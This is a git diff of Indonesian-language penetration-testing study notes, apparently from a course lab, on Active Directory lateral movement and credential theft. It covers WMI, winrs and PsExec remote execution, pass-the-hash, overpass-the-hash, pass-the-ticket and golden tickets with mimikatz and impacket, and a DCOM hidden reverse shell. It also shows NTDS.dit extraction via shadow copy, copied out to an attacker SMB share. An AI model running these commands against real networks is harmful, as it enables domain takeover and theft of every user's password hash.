@@ -1292,6 +1292,7 @@ hashcat -m 13100 kerberos_hash /usr/share/wordlists/rockyou.txt -r append_1.rule
 #### day 15
 
 
+
 Masih dalam module attacking authentication active directory, disini kita akan belajar terkait Silver Ticket.
 
 Pada cara kerja kerberos, aplikasi server berjalan dalam konteks service account memerikza izin user dari  group member yang ada di service ticket. Ada yang namanya PAC(Privileged Account Certificate) yang merupakan opsi verifikasi SPN application dan Domain Controller yang jika diaktifkan user akan divalidasi oleh DC, dan pada serangan kali ini untungnya aplikasi jarang melakukan validas PAC.
@@ -1389,11 +1390,16 @@ Jadi disini kita akan belajar tentang :
 
 
 
+WMI membuat process melalui method class win32_process dan berkomunikasi dengan RPC melalui port 135 untuk akses jarak jauh. 
+
+Contoh command ini akan menjalankan calc.exe pada node 73
 ```
 wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
 ```
+dan jika masuk pada machine tsb maka akan melihat win32calc.exe muncul sebagai jen
 
-Script powershell menggunakan WMI :
+
+Kita juga bisa membuat script powershell yang menjalankan WMI sebagai berikut:
 ```
 $username = 'jen';
 $password = 'Nexus123!';
@@ -1404,16 +1410,17 @@ $Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -S
 $Command = 'payload_revshell'
 Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
 ```
+Dimana script diatas digunakan untuk melakukan reverse shell
 
 
-winrs :
+Selain menggunakan powershell, wmi juga di implementasikan menggunakna utilitas winrs(windows remote shell) dengan syarat domain user harus menjadi group administrator atau remote user management
 
 ```
 winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
 ```
 
 
-dalam powershell : 
+dalam powershell kita juga bisa memanggil seperti ini : 
 ```
 $username = 'jen';
 $password = 'Nexus123!';
@@ -1423,9 +1430,14 @@ New-PSSession -ComputerName 192.168.220.73 -Credential $credential
 
 Enter-PSSession 1
 ```
+Dimana kita bisa langsung melakukan spawning console langsung pada host target
 
 ###### PSEXEC
 
+PsExec juga merupakan tools yang menyediakan eksekusi remote process pada host lain tapi dengan syarat berikut: 
+- User harus melakukan authentikasi ke machine target
+- Share  ADMIN$ harus tersedia
+- file sharing dan printer harus enable
 
 command : 
 ```
@@ -1434,6 +1446,14 @@ command :
 
 ##### Pass the Hash
 
+Pass the hash merupakan teknik authentikasi dengan menggunakan hash NTLM alih alih password plain-text, dan hanya berfungsi jika server menggunakan authentikasi NTLM yang bukan kerberos.
+
+seperti pada psexec, pass the hash mempunyai syarat agar berhasil :
+- port 445 harus aktif
+- fitur sharing file dan printer windows harus aktif
+- writable pada share ADMIN$
+
+commandnya simple, kita bisa menggunakan impacket untuk inii
 ```
 impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
 
@@ -1441,29 +1461,35 @@ impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.
 ```
 ##### Overpass the Hash
 
+Merupakan teknik yang menyalahgunakan hash NTLM untuk mendapatkan kerberos TGT, dan dengan TGT kita bisa mendapatkan TGS. Disini user yang ingin kita compromise harus terlebih dulu melakukan authentikasi pada machine. dengan itu maka credential otomatis dilakukan caching dan kita bisa ekstraksi dengan mimikatz. 
+
+Langkah langkah sebagai berikut :
 ```
-//dump
+//dump(user dave)
 sekurlsa::logonpasswords
 
-//convert ntlm to TGT
+//convert ntlm to TGT(user dave)
 sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
 
-//in new session
+//in new session(user dave)
 klist
 
-//login interactive to files04
+//login interactive to files04(user jen) 
 net use \\files04
 
-//check ticket again
+//check ticket again(user dave)
 klist
 
-//Using psexec connect to \\files04
+//Using psexec connect to \\files04(user dave)
 .\PsExec.exe \\files04 cmd
 ```
 
 
 ##### Pass the ticket
 
+Serangan ini memanfaaktan TGS dan melakukan export kembali di jaringan maupun host lain dan kemudian digunakan untuk authentikasi ke service tertentu. Jadi semacam menggunakan session user lain untuk melakukan akses ke service tertentu
+
+Dibawah ini command yang digunakan untuk akses service web04 dari user jen ke user dave menggunakan kirbi file yang di ekstrak dari kerberos
 ```
 //check access is denied
 ls \\web04\backup 
@@ -1489,14 +1515,94 @@ ls \\web04\backup
 
 ##### DCOM 
 DCOM merupakan protokol yang sangat lama digunakan pada windows dimana komunikasinya menggunakan RPC pada port 135, dan dengan memanfaatkan DCOM kita bisa melakukan lateral movement
+
+Menggunakan powershell kita bisa memanfaatkan dcom untuk akses ke machine lain dengan syarat kita mempunyai administrator privileges
 ```
 $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.125.73"))
 
 $dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
 
 //or reverse shell
+
  $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e base64payload","7")
 ```
 
 
 #### day 16
+
+Masih pada attack authentication directory, disini kita belajar tentang golden ticket dan shadow copy. 
+
+golden ticket merupakan serangan yang memanfaatkan hash krbtgt untuk mengakses semua resource domain. serangan ini memalsukan TGT dimana kita bisa menyatakan user dengan hak privilege rendah yang bisa kita ubah sebagai Domain Admins
+
+
+akses ke DC dengan psexec akan access denied karena tidak ada izin.
+```
+PsExec64.exe \\DC1 cmd.exe
+```
+
+Jadi kita perlu melakukan ekstraksi menggunakan mimikatz untuk mengambil hash krbtgt
+
+```
+privilege::debug
+lsadump::lsa /patch
+```
+
+Setelah mendapat hash krbtgt kita bisa melakukan serangan kembali menggunakan mimikatz, tapi sebelum itu kita perlu mengosongkan ticket pada machine kita
+
+```
+kerberos::purge
+```
+
+dan payload fullnya 
+
+```
+//sid bisa diambil dari : whoami /user or Get-DomainController -LDAP | Select objectsid
+
+kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+
+
+//untuk aktifkan session cmd
+misc::cmd
+```
+
+Yang jika kita verifikasi menggunakna psexec seharusnya berhasil
+
+```
+PsExec.exe \\dc1 cmd.exe
+
+//verifikasi dengan 
+whoami /groups
+```
+
+##### Shadow Copy
+
+Shadow copy merupakan teknologi backup pada microsoft yang dapat digunakan untuk membuat suatu snapshot file atau volume. binary yang digunakan yaitu vshadow.exe dan kita dapat membuat shadow copy untuk melakukan ekstarksi file database active directory NTDS.dit dan hive system untuk mendapatkan semua hash user pada domain.
+
+
+Command ini digunakan untuk disable writter untuk mempercepat proses pencadangan
+```
+vshadow.exe -nw -p  C:
+```
+
+Lalu lanjut untuk copy ke folder root C:
+```
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
+
+
+//dan kemudian ekstrak hive system
+reg.exe save hklm\system c:\system.bak
+
+//setelah itu pindahkan pada local machine kita 
+in kali : sudo impacket-smbserver share . -smb2support -user kali -password kali
+
+in windows :
+copy system.bak x:
+copy ntds.dit.bak x:
+
+```
+
+kemudain extract menggunakan impacket-secretdump
+
+```
+impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
+```
